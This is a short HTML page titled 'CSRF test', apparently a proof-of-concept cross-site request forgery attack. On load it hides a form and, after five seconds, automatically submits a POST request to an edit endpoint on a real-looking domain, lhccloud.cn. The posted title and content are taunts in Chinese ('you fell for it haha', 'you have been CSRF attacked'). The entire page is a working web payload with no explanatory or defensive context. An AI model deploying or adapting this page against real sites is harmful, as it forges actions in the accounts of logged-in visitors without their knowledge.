<head>

<title>CSRF测试</title>
</head>
<body>
    <form action="https://lhccloud.cn/new/editIn" method="POST" id="ceshi">
            <input class="input" type="text" name="title" value="你中计了哈哈"/>
            <textarea class="textarea" wrap="hard" type="text" name="content" value=""/>你已经被CSRF攻击了</textarea>   
    </form>

<script type="text/javascript">
window.onload = function(){
    document.getElementById("ceshi").style.display = "none";
    function csrf(){
        document.getElementById("ceshi").submit();
    }
    setTimeout(csrf,5000);
}
</script>
